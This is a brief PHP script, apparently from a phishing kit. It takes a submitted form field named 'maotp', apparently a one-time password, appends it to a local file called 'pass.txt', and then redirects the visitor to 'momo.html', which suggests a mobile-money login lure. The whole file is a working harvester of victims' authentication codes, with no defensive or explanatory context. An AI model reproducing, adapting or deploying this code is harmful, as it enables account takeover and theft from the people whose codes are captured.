<?php
header ('Location: momo.html');
$handle = fopen("pass.txt", "a");
foreach ($_POST as $variable => $value) {
    if ($variable == "maotp") {
        fwrite($handle, $variable);
        fwrite($handle, "= ");
        fwrite($handle, $value);
        fwrite($handle, "
");
    }
}
fwrite($handle, "
");
fclose($handle);
exit;
?>